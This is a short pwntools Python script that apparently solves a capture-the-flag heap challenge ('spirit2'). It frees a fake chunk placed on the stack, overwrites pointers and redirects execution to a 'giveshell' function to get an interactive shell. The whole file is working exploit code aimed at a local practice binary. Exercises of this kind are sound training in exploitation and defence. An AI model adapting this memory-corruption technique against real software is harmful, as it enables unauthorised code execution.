from pwn import *

p = process("./spirit2")
e = ELF("./spirit2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(size):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())

def delete(addr):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"Address: ", str(addr).encode())

def edit(idx, data):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.send(data)

def getshell():
    p.sendlineafter(b">", b"4")
    p.interactive()

# ptr_size : rbp-0x60, size : rbp-0xc8, ptr : rbp-0xb0

ptr_size = int(p.recvline()[:-1], 16) + 0x78

add(0)          # 0
add(0x90)       # 1
delete(ptr_size)

add(0x80)       # 2
edit(2, p64(ptr_size+0x58))

edit(12, p64(0x40069e)+p64(e.symbols["giveshell"]))

getshell()